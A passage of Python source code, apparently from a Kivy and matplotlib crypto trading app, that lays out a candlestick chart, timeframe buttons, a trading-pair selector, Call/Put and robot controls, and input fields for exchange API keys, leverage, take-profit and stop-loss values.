                #datos para representacion inicial todas las velas japonesas en el grafico-------------------
                self.linea_precio_TR= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.linea_Valor_precio_TR= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center', zorder=1000, ha='right', bbox=dict(facecolor="white", edgecolor="white", boxstyle='round4'))
                #precio clave
                self.precioclave222xxx= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.precioclave222= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="blue", boxstyle='round4'))               
                self.precioclave222xxx111= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.precioclave222111= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="blue", boxstyle='round4'))
                #movimiento mouse------------------------------------------------------
                self.linexkx = self.ax.axhline(y=0,color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.textxkx = self.ax.text(0, 0, 0,color ="white", fontname=self.estilo_letra, fontsize=self.tamanio_letra,va="bottom", ha='left', bbox=dict(facecolor="black", edgecolor="black", boxstyle='round4'))
                self.vlinex = self.ax.axvline(x=0, color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)           
                self.color_1,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_2,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_3,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_3YY,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_4,=self.ax.plot(0,0, linestyle='None') 
                self.linea_1ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_4ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                
                self.linea_7ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7ax1, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_13ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_16ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_19ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_19ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_22ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_22ax6, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_4444ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_1666ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax22, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7axxx, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                                     
                self.linea_7axZZZ, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)             
                self.linea_19axzz, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)               
                self.linea_x111, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_7axqq, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3) 
                self.linea_7axqqmas, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7axe, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                 
                self.xyR3_1 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_R3_1 = Polygon(self.xyR3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
                self.ax.add_patch(self.rect_R3_1)
                self.xyS3_1 = [(0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_S3_1 = Polygon(self.xyS3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
                self.ax.add_patch(self.rect_S3_1)
                self.xyS3_2 = [(0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_S3_2 = Polygon(self.xyS3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
                self.ax.add_patch(self.rect_S3_2)
                self.xyR3_2 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_R3_2 = Polygon(self.xyR3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
                self.ax.add_patch(self.rect_R3_2)                
                self.grfresisteb,=self.ax.plot(0,0, color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.grfsoporteb,=self.ax.plot(0,0, color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                # rendimiento en binarias
                #self.ax25 = inset_axes(self.ax, width="40%", height="15%", loc='upper left')             
                #self.ax25.set_title("Development of capital",fontsize=self.tamanio_letra,pad=10, color='white') 
                #self.ax25.set_facecolor((0, 0, 0, 1))
                #self.ax25.grid(False)                                           
                #self.ax25.yaxis.set_ticks_position('right')                   
                #max_de_capital=float("{0:.2f}".format(max(self.registro_saldo)))
                #min_de_capital=float("{0:.2f}".format(min(self.registro_saldo)))                             
                #indice = range(len(self.registro_saldo))                    
                #self.binaria, = self.ax25.plot(indice,self.registro_saldo,"wo-",linewidth=self.grosor_linea3,ms=2)
                #self.ax25.set_xlim(0,1)                    
                #margin = 0.4 * (max(self.registro_saldo) - min(self.registro_saldo))
                #self.ax25.set_ylim(min(self.registro_saldo) - margin, max(self.registro_saldo) + margin*self.escly)
                #self.capital_maximo= self.ax25.axhline(y=max_de_capital, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                #self.capital_minimo= self.ax25.axhline(y=min_de_capital, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                #axadsdsd=float("{0:.2f}".format(self.registro_saldo[-1]))               
                #self.ax25.legend([self.binaria,self.capital_maximo,self.capital_minimo],[f"Cap: {axadsdsd} USD",f"Max: {max_de_capital} USD",f"Min: {min_de_capital} USD"],edgecolor="black",loc ='upper center', labelcolor="white", ncol=5, fontsize=6,labelspacing=0.1,facecolor="k",bbox_to_anchor=(0.5, self.niv_pos))                                
                #self.ax25.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                #self.ax25.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')
                #--------Volumen del mercado------------------------------------------------------------------------------------------------------------------------------------------------------------------  
                #self.ax26 = inset_axes(self.ax, width="100%", height="15%", loc='upper right')             
                #self.ax26.set_title("Market activity",fontsize=self.tamanio_letra,pad=10, color='white') 
                #self.ax26.set_facecolor((0, 0, 0, 1))
                #self.ax26.grid(False)                                           
                #self.ax26.yaxis.set_ticks_position('right')
                #self.ax26.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                #self.ax26.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')                 
                #indice_volumen_market = range(len(self.volumen_market))                    
                #self.binaria_111, = self.ax26.plot(indice_volumen_market,self.volumen_market,"wo-",linewidth=self.grosor_linea3,ms=2)
                #self.promedio_volumen = self.ax26.axhline(y=0, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)                
                self.canvas = FigureCanvasKivyAgg(self.figz)
                #self.cid = self.figz.canvas.mpl_connect('motion_notify_event', self.on_movex)                    
                self.figura_guardada.add_widget(self.canvas)    
                #Contenedor_operaciones1.add_widget(self.widget15_2333)
                Contenedor_operaciones1.add_widget(self.widget15_2)
                Contenedor_operaciones1.add_widget(self.widget15_1)                
                Contenedor_operaciones1.add_widget(self.widget15_2333xxx)                   
                Contenedor_operaciones.add_widget(Contenedor_operaciones1)  
                self.Contenedor_2a.add_widget(self.figura_guardada)
                #self.Contenedor_2a.add_widget(Contenedor_operaciones)
                self.Contenedor_22a = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)
                self.main_layout.add_widget(self.Contenedor_2a) 
                self.Contenedor_22a.add_widget(self.spinner)
                self.main_layout.add_widget(self.Contenedor_22a)                               
                with self.main_layout.canvas.before:
                    Color(0, 0, 0, 1)  # Color blanco (RGBA)
                    self.rect = Rectangle(size=self.main_layout.size, pos=self.main_layout.pos)
                self.main_layout.bind(size=self._update_rect, pos=self._update_rect)                                                 
                Clock.schedule_once(self.hacer_lista)                                                                    
            else:
                self.widget5.text= "Your login details are not correct. Please try again.\n(If the problem persists, please contact the COINEX_AUTOMATIC_TRADING developer)"
                self.widget5.background_color = [1, 0, 0, 1]                  
        except:                            
            self.widget5.text= "Your login details are not correct. Please try again.\n(If the problem persists, please contact the COINEX_AUTOMATIC_TRADING developer)"
            self.widget5.background_color = [1, 0, 0, 1]
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------         
    def dfadadasdadsad111(self, instance):
        try:        
            wwww=1  
            if wwww==1:            
                self.main_layout.clear_widgets()            
                self.widget18 = ToggleButton(text='1min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,state="down") 
                self.widget19 = ToggleButton(text='5min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget20 = ToggleButton(text='15min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget21 = ToggleButton(text='30min',group='opciones1',  background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget22 = ToggleButton(text='1hour',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget23 = ToggleButton(text='4hour',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget24 = ToggleButton(text='1day',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget25 = ToggleButton(text='1week',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                #self.widget26 = ToggleButton(text='1month',group='opciones1', background_normal='',background_color=a8,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner = Spinner(
                text="BTCUSDT",
                values=("BTCUSDT","ETHUSDT","LTCUSDT","XRPUSDT","TRXUSDT","BCHUSDT","EOSUSDT","BNBUSDT","ADAUSDT","DOGEUSDT","DOTUSDT","LINKUSDT","XLMUSDT","AVAXUSDT","SOLUSDT","UNIUSDT","ATOMUSDT","VETUSDT","AAVEUSDT"),font_size=self.TAMAÑO_TEXTOS,font_name=self.estilo_letra,            
                size=(15, 15))                
                self.spinner.bind(text=self.on_spinner_select)               
                self.widget18.bind(on_press=self.on_toggle1)
                self.widget19.bind(on_press=self.on_toggle2) 
                self.widget20.bind(on_press=self.on_toggle3) 
                self.widget21.bind(on_press=self.on_toggle4) 
                self.widget22.bind(on_press=self.on_toggle5)
                self.widget23.bind(on_press=self.on_toggle6) 
                self.widget24.bind(on_press=self.on_toggle7)
                self.widget25.bind(on_press=self.on_toggle8)      
                widget15 = Button(text='Close application', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                widget15.bind(on_press=self.close_app)                
                self.widget15_1 = Button(text="Call\n(0)", background_normal='',background_color="green", halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_1.bind(on_press=self.Comprar_call)
                self.widget15_2 = Button(text='Put\n(0)',background_normal='',background_color="red", halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_2.bind(on_press=self.Comprar_put)                
                self.widget15_2333 = Button(text='Robot\n(OFF)', background_normal='',background_color=color_botones, halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_2333.bind(on_press=self.AUTO)
                self.widget15_2333xxx = Button(text='Stop', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget15_2333xxx.bind(on_press=self.Detener_operaciones)    
                Contenedor_1a = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)
                #Contenedor_1a.add_widget(self.spinner)
                Contenedor_1a.add_widget(self.widget18)
                Contenedor_1a.add_widget(self.widget19)
                Contenedor_1a.add_widget(self.widget20)
                Contenedor_1a.add_widget(self.widget21)
                Contenedor_1a.add_widget(self.widget22)
                Contenedor_1a.add_widget(self.widget23)
                Contenedor_1a.add_widget(self.widget24)
                Contenedor_1a.add_widget(self.widget25)
                Contenedor_operaciones = BoxLayout(orientation='horizontal', size_hint=(0.045, 1),spacing=3)                                
                Contenedor_operaciones1 = BoxLayout(orientation='vertical', size_hint=(1, 1),spacing=3)    
                self.main_layout.add_widget(Contenedor_1a)
                self.Contenedor_22aqqqttt = BoxLayout(orientation='horizontal',size_hint=(1, 1))
                self.Contenedor_22aqqq = BoxLayout(orientation='horizontal',size_hint=(1, 1)) 
                self.widget100looo0xxx = Label(color=(1, 1, 1, 1),text='API key:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo1xxx = Label(color=(1, 1, 1, 1),text='Secret Key:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner_22XXX = TextInput(
                    multiline=False,
                    halign='center',hint_text="key",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                self.spinner_22XXX1 = TextInput(
                    multiline=False,
                    halign='center',hint_text="key",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones) 
                img_datax = base64.b64decode(self.img_base64_2)
                image_streamx = io.BytesIO(img_datax)
                core_imagex = CoreImage(image_streamx, ext='png')  # Cambia 'png' si es otro formato
                img_widgetx = Image()
                img_widgetx.texture = core_imagex.texture        
                self.widget1xxxxxx = img_widgetx
                self.widget100looo0 = Label(color=(1, 1, 1, 1),text='Investment:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo1 = Label(color=(1, 1, 1, 1),text='Leverage:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo2 = Label(color=(1, 1, 1, 1),text='Take profit:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo3 = Label(color=(1, 1, 1, 1),text='Stop loss:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo4 = Label(color=(1, 1, 1, 1),text='Fee:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner_20auto = Spinner(text='0.0002',  # Valor inicial del spinner
                    values=["0.0001", "0.0002", "0.0003", "0.0004", "0.0005","0.0006","0.0007"],  # Valores disponibles para seleccionar
                    size=(15, 15),
                    font_size=self.TAMAÑO_TEXTOS,
                    font_name=self.estilo_letra,
                    background_normal='',
                    background_color=color_botones
                )                                       
                self.spinner_20 = self.spinner_20 = TextInput(text="2",hint_text="Value",input_filter="float",multiline=False,halign='center',hint_text_color=[1, 1, 1, 1],foreground_color=[1, 1, 1, 1],font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                self.spinner_20.bind(focus=self.on_focus_change)
                valores_permitidos = [str(i) for i in range(10, 101, 10)]  # [10, 20, 30, ..., 100]
                self.spinner_21 = Spinner( text='10',values=valores_permitidos,  size=(15, 15) ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                # Función para validar que solo se ingresen números y un solo punto
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
                def solo_numeros_y_un_punto(texto, desde_undo=False):
                    nuevo_texto = []
                    punto_count = 0  # Contador para asegurar que solo haya un punto
                    for c in texto:
                        if c.isdigit():  # Permite dígitos (0-9)
                            nuevo_texto.append(c)
                        elif c == '.' and punto_count == 0:  # Permite solo un punto
                            nuevo_texto.append(c)
                            punto_count += 1
                    return ''.join(nuevo_texto)
                
                # Crear el TextInput que solo admite números y un separador decimal
                self.spinner_22 = TextInput(
                    multiline=False,
                    halign='center',hint_text="Value",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones,
                    input_filter=solo_numeros_y_un_punto  # Filtro para números y un separador decimal
                )
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                
                def solo_numeros_y_un_punto1(texto2, desde_undo=False):
                    nuevo_texto2 = []
                    punto_count = 0  # Contador para asegurar que solo haya un punto
                    for c in texto2:
                        if c.isdigit():  # Permite dígitos (0-9)
                            nuevo_texto2.append(c)
                        elif c == '.' and punto_count == 0:  # Permite solo un punto
                            nuevo_texto2.append(c)
                            punto_count += 1
                    return ''.join(nuevo_texto2)
                #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
                # Crear el TextInput que solo admite números y un separador decimal
                self.spinner_23 = TextInput(
                    multiline=False,
                    halign='center',hint_text="Value",hint_text_color=[1, 1, 1, 1],foreground_color=[1, 1, 1, 1],font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones,
                    input_filter=solo_numeros_y_un_punto1 # Filtro para números y un separador decimal
                )                
                self.Contenedor_22afff111 = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)
                self.Contenedor_22afff = BoxLayout(orientation='vertical',size_hint=(1, 0.1))
                self.widget999991 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs1,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999992 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs2,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999993 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs3,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999994 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs4,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999995 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs5,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999996 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs6,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999997 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs7,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999998 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs8,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.Contenedor_22aqqqttt.add_widget(self.widget1xxxxxx)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo0xxx)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22XXX)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo1xxx)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22XXX1)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo0)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_20)                
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo2)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo3)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_23)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo1)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_21)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo4)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_20auto)             
                self.Contenedor_22aqqq.add_widget(self.widget999991)
                self.Contenedor_22aqqq.add_widget(self.widget999992)
                self.Contenedor_22aqqq.add_widget(self.widget999993)
                self.Contenedor_22aqqq.add_widget(self.widget999994)
                self.Contenedor_22aqqq.add_widget(self.widget999995)
                self.Contenedor_22aqqq.add_widget(self.widget999996)
                self.Contenedor_22aqqq.add_widget(self.widget999997)
                self.Contenedor_22aqqq.add_widget(self.widget999998)
                self.Contenedor_22afff111.add_widget(self.Contenedor_22aqqqttt)                            
                self.Contenedor_22afff.add_widget(self.Contenedor_22aqqq)
                #self.main_layout.add_widget(self.Contenedor_22afff111)
                #self.main_layout.add_widget(self.Contenedor_22afff)
                self.Contenedor_2a = BoxLayout(orientation='horizontal', size_hint=(1, 1))
                self.figura_guardada = BoxLayout(orientation='horizontal', size_hint=(1, 1))
                self.figz = Figure(figsize=(12, 12), dpi=100,facecolor=self.colorall)            
                self.figz.subplots_adjust(left=self.izquierdag, right=self.derechag, top=1, bottom=0)
                self.ax = self.figz.add_subplot(111, facecolor= self.colorall) 
                self.ax.spines['top'].set_visible(False)    # Elimina el borde superior
                self.ax.spines['right'].set_visible(False)  # Elimina el borde derecho
                self.ax.spines['bottom'].set_visible(False) # Elimina el borde inferior
                self.ax.spines['left'].set_visible(False)   # Elimina el borde izquierdo      
                # Establecer el tamaño y estilo de la fuente para los valores de los ejes
                self.ax.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')
                self.ax.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                self.ax.grid(False) 
                self.ax.xaxis.label.set_color('white')  # Color de la etiqueta del eje X
                self.ax.yaxis.label.set_color('white')  # Color de la etiqueta del eje Y
                #datos para representacion inicial todas las velas japonesas en el grafico-------------------
                self.linea_precio_TR= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.linea_Valor_precio_TR= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center', zorder=1000,  ha='right', bbox=dict(facecolor="white", edgecolor="white", boxstyle='round4'))
                #precio clave
                self.precioclave222xxx= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.precioclave222= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="blue", boxstyle='round4'))               
                self.precioclave222xxx111= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.precioclave222111= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="blue", boxstyle='round4'))
                #movimiento mouse------------------------------------------------------
                self.linexkx = self.ax.axhline(y=0,color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.textxkx = self.ax.text(0, 0, 0,color ="white", fontname=self.estilo_letra, fontsize=self.tamanio_letra,va="bottom", ha='left', bbox=dict(facecolor="black", edgecolor="black", boxstyle='round4'))
                self.vlinex = self.ax.axvline(x=0, color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)           
                self.color_1,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_2,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_3,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_3YY,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
                self.color_4,=self.ax.plot(0,0, linestyle='None') 
                self.linea_1ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_4ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                
                self.linea_7ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7ax1, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_13ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_16ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_19ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_19ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_22ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_22ax6, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_4444ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_1666ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_10ax22, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7axxx, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                                     
                self.linea_7axZZZ, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)             
                self.linea_19axzz, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)               
                self.linea_x111, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
                self.linea_7axqq, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3) 
                self.linea_7axqqmas, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.linea_7axe, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                 
                self.xyR3_1 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_R3_1 = Polygon(self.xyR3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
                self.ax.add_patch(self.rect_R3_1)
                self.xyS3_1 = [(0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_S3_1 = Polygon(self.xyS3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
                self.ax.add_patch(self.rect_S3_1)
                self.xyS3_2 = [(0, 0),(0, 0),(0, 0),(0, 0)]
                self.rect_S3_2 = Polygon(self.xyS3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
                self.ax.add_patch(self.rect_S3_2)
                self.xyR3_2 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
